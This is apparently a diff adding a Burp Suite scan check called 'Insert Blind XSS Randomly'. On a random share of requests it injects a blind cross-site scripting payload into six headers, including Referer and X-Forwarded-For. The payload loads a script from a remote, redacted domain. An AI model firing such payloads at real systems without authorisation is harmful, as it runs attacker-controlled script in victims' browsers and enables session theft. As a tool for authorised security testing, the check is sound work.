@@ -1,0 +1,22 @@
+metadata:
+    language: v2-beta
+    name: "Insert Blind XSS Randomly"
+    description: "Inserts blind xss payloads in headers 23% of the time"
+    author: "BuffaloWill"
+    tags: "xss", "bxss", "active", "bce"
+
+define:
+    z="{random_str(1)}"
+    bxss="\"><script src=\"https://[DOMAIN]/q\"></script>"
+
+given request then    
+    if {z} matches "[a-f]" then
+        send request called check:
+            appending headers:
+                "X-Forwarded-Proto": `{bxss}`,
+                "Referer": `{bxss}`,
+                "X-Forwarded-For": `{bxss}`,
+                "True-Client-IP": `{bxss}`,
+                "X-Client-IP": `{bxss}`,
+                "X-Real-IP": `{bxss}`
+   end if
